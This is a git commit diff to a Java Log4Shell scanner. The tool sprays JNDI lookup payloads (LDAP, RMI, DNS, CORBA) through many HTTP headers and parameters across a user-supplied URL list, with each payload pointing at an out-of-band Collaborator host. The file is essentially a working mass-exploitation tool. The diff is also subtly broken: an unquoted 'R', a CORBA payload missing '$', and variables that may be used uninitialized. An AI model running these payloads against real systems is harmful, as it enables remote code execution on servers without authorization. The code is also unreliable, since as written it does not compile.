327c6303b5b0c7bbb27552151a5cb4db4ae9ff0b
honbugit <100542880+honbugit@users.noreply.github.com>
2024-04-30 21:06:03 -0400

    Adding additional payloads

--- scanner/log4jscanner.java
+++ scanner/log4jscanner.java
@@ -1,26 +1,18 @@
-import org.apache.http.client.HttpClient;
 import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.HttpClients;
 import org.apache.http.util.EntityUtils;
-import org.jsoup.Jsoup;
-import org.jsoup.nodes.Document;
-import org.jsoup.select.Elements;
-import org.jsoup.nodes.Element;
-
-import java.io.*;
-import java.net.URLEncoder;
-import java.util.ArrayList;
 import java.util.Scanner;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
+import java.io.File;
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.util.ArrayList;
+import java.net.URLEncoder;
 
 public class log4jscanner {
-
-    private static final String OUTPUT_FILE = "extracted_urls.txt";
 
     public static void main(String[] args) {
         Scanner scanner = new Scanner(System.in);
@@ -28,22 +20,18 @@ public class log4jscanner {
             HttpClient client = HttpClients.createDefault();
             System.out.println("Enter the Burp Collaborator URL:");
             String oobPayload = scanner.nextLine();
-            String payload = "${jndi:ldap://" + oobPayload + "}";
-
+            String payload = "";
             System.out.println("Enter the path to the file containing URLs (one per line):");
             String filePath = scanner.nextLine();
             ArrayList<String> urls = readUrlsFromFile(filePath);
 
-
-            int recursiveDepth = 2;
-
             System.out.println("Do you want to add custom headers? (yes/no)");
-            String useCustomHeaders = scanner.next().trim().toLowerCase();
+            String useCustomHeaders = scanner.nextLine().trim().toLowerCase();
             String[] headersToUse;
 
             if ("yes".equals(useCustomHeaders)) {
                 System.out.println("Enter your custom headers (comma-separated):");
-                String customHeaders = scanner.next();
+                String customHeaders = scanner.nextLine();
                 headersToUse = customHeaders.split(",");
             } else {
                 headersToUse = new String[] {
@@ -70,28 +58,67 @@ public class log4jscanner {
                         "X-Real-IP"
                 };
             }
-
+            System.out.println("What kind of JNDI lookup do you want to perform? (L = LDAP, C = CORBA, R = RMI, D = DNS)");
+            String jndiinput = scanner.nextLine();
+            if(jndiinput.equals("L"))
+                payload = "${jndi:ldap://" + oobPayload + "}";
+            else if(jndiinput.equals(R))
+                payload = "${jndi:rmi://" + oobPayload + ":1099/customobject}";
+            else if(jndiinput.equals("D"))
+                payload = "${jndi:dns://" + oobPayload+"}";
+            else if(jndiinput.equals("C"))
+            {
+                System.out.println("Do you want to use a custom port or Name Server? (Default port is 1050 and Default Name Server is NameServer). Y/N");
+                String corbaask = scanner.nextLine();
+                String corbaport;
+                String corbaname;
+                if(corbaask.equals("N"))
+                {
+                    corbaport = "1050";
+                    corbaname = "NameServer";
+                }
+                else if(corbaask.equals("Y"))
+                {
+                        System.out.println("Enter your port and name server");
+                        corbaport = scanner.nextLine();
+                        corbaname = scanner.nextLine();
+                }
+                else
+                {
+                    System.out.println("Invalid input");
+                    System.exit(0);
+                }
+                payload = "{jndi:corbaname://" + oobPayload +":"+corbaport+"/"+corbaname+"}";
+            }
+            else
+            {
+                System.out.println("Please provide a valid lookup request(L = LDAP, C = CORBA, R = RMI, D = DNS)");
+                System.exit(0);
+            }
             System.out.println("Enter parameter names (format: name1,name2):");
-            String paramsInput = scanner.next();
+            String paramsInput = scanner.nextLine();
             String[] params = paramsInput.split(",");
 
             System.out.println("Do you want to send a GET or POST request? (G/P):");
-            String requestType = scanner.next().trim().toUpperCase();
+            String requestType = scanner.nextLine().trim().toUpperCase();
 
-            ExecutorService executor = Executors.newFixedThreadPool(5);
+            int requestCount = 0;
             for (String url : urls) {
-                Runnable task = () -> {
-                    try {
-                        sendRequest(client, url, headersToUse, params, payload, requestType, recursiveDepth);
-                    } catch (Exception e) {
-                        System.out.println("Error handling request for URL: " + url);
-                        e.printStackTrace();
-                    }
-                };
-                executor.execute(task);
+                if ("P".equals(requestType)) {
+                    sendPostRequest(client, url, headersToUse, params, payload);
+                } else if ("G".equals(requestType)) {
+                    sendGetRequest(client, url, headersToUse, params, payload);
+                } else {
+                    System.out.println("Invalid request type. Please enter 'G' for GET or 'P' for POST.");
+                    continue;
+                }
+
+                requestCount++;
+                if (requestCount % 10 == 0) {
+                    System.out.println("Pausing for 5 seconds...");
+                    Thread.sleep(5000);
+                }
             }
-            executor.shutdown();
-            executor.awaitTermination(1, TimeUnit.HOURS);
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
@@ -108,21 +135,8 @@ public class log4jscanner {
                 urls.add(line.trim());
             }
         }
+        System.out.println(urls.size()+" Count of urls");
         return urls;
-    }
-
-    private static void sendRequest(HttpClient client, String url, String[] headers, String[] params, String payload, String requestType, int recursiveDepth) throws Exception {
-        if (recursiveDepth <= 0) {
-            return;
-        }
-
-        recursiveDepth--;
-
-        if ("P".equals(requestType)) {
-            sendPostRequest(client, url, headers, params, payload);
-        } else if ("G".equals(requestType)) {
-            sendGetRequest(client, url, headers, params, payload);
-        }
     }
 
     private static void sendPostRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
@@ -145,11 +159,9 @@ public class log4jscanner {
         StringEntity requestEntity = new StringEntity(formData.toString());
         postRequest.setEntity(requestEntity);
 
+        printRequestHeaders(postRequest);
         HttpResponse response = client.execute(postRequest);
-        String responseBody = EntityUtils.toString(response.getEntity());
-        EntityUtils.consume(response.getEntity());
-        printResponseDetails(response, responseBody);
-        extractUrls(url, responseBody);
+        printResponseDetails(response);
     }
 
     private static void sendGetRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
@@ -168,28 +180,30 @@ public class log4jscanner {
             getRequest.setHeader(header.trim(), payload);
         }
 
+        printRequestHeaders(getRequest);
         HttpResponse response = client.execute(getRequest);
-        String responseBody = EntityUtils.toString(response.getEntity());
-        EntityUtils.consume(response.getEntity());
-        printResponseDetails(response, responseBody);
-        extractUrls(url, responseBody);
+        printResponseDetails(response);
     }
 
-    private static void printResponseDetails(HttpResponse response, String responseBody) {
-        System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
-        System.out.println("Response Body: " + responseBody);
-    }
-
-    private static void extractUrls(String baseUrl, String htmlContent) throws IOException {
-        Document doc = Jsoup.parse(htmlContent, baseUrl);
-        Elements links = doc.select("a[href], form[action]");
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
-            for (Element link : links) {
-                String foundUrl = link.tagName().equals("form") ? link.absUrl("action") : link.absUrl("href");
-                if (!foundUrl.isEmpty()) {
-                    writer.write(foundUrl + "\n");
-                }
-            }
+    private static void printRequestHeaders(HttpGet getRequest) {
+        System.out.println("The GET request sent is:");
+        System.out.println(getRequest);
+        for (int i = 0; i < getRequest.getAllHeaders().length; i++) {
+            System.out.println(getRequest.getAllHeaders()[i]);
         }
     }
+
+    private static void printRequestHeaders(HttpPost postRequest) {
+        System.out.println("The POST request sent is:");
+        System.out.println(postRequest);
+        for (int i = 0; i < postRequest.getAllHeaders().length; i++) {
+            System.out.println(postRequest.getAllHeaders()[i]);
+        }
+    }
+
+    private static void printResponseDetails(HttpResponse response) throws Exception {
+        System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
+        System.out.println("Response Body: " + EntityUtils.toString(response.getEntity()));
+    }
 }
+                                                                                                                                     
